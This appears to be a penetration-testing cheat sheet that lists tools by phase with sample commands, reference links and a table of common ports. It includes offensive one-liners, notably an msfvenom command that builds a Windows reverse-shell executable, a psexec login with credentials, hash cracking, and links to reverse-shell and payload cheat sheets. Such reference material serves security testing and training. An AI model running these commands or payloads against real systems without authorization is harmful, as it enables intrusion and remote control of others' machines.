# USEFUL TOOLS & RESOURCES

## Essential Tools by Phase

### Reconnaissance
- **whois:** Domain info
  ```bash
  $ whois example.com
  ```
- **nslookup/dig:** DNS queries
  ```bash
  $ dig example.com
  ```
- **Hunter.io:** Email discovery
- **Shodan:** Connected devices

### Scanning
- **Nmap:** Port scanning
  ```bash
  $ nmap -T4 -p- 192.168.1.100
  ```
- **Masscan:** Faster alternative
  ```bash
  $ masscan 192.168.1.0/24 -p22,80,443 --rate=1000
  ```
- **Nessus:** Vulnerability scanner
  ```bash
  # https://localhost:8834
  ```

### Enumeration
- **Nikto:** Web server scanner
  ```bash
  $ nikto -h http://192.168.1.100
  ```
- **SMBMap:** SMB share mapping
  ```bash
  $ smbmap -H 192.168.1.100
  ```
- **Impacket:** Network tools (PSExec, etc)
  ```bash
  $ impacket-psexec user:pass@192.168.1.100
  ```

### Exploitation
- **Metasploit:** Framework
  ```bash
  $ msfconsole
  ```
- **SearchSploit:** Exploit database
  ```bash
  $ searchsploit Apache 2.4.7
  ```
- **Msfvenom:** Payload generator
  ```bash
  $ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
  ```

### Post-Exploitation
- **LinPEAS/WinPEAS:** Privilege escalation enum
  ```bash
  $ ./linpeas.sh
  ```
- **PSpy:** Process monitoring
  ```bash
  $ ./pspy64
  ```
- **Hashcat:** Hash cracking
  ```bash
  $ hashcat -m 0 hashes.txt wordlist.txt
  ```

## Useful Links

### General
- ExploitDB: https://www.exploit-db.com
- CVE Details: https://www.cvedetails.com
- HackTricks: https://book.hacktricks.xyz

### Privilege Escalation
- GTFOBins: https://gtfobins.org (Linux)
- LOLBAS: https://lolbas-project.github.io (Windows)

### Wordlists
- SecLists: https://github.com/danielmiessler/SecLists
- Rockyou: /usr/share/wordlists/rockyou.txt

### Shells & Payloads
- Reverse Shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- MSFVenom Cheat: https://blog.rapid7.com/

## Quick Reference - Common Ports
| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 143 | IMAP |
| 389 | LDAP |
| 443 | HTTPS |
| 445 | SMB |
| 3306 | MySQL |
| 3389 | RDP |
| 5432 | PostgreSQL |
| 8080 | HTTP Alt |

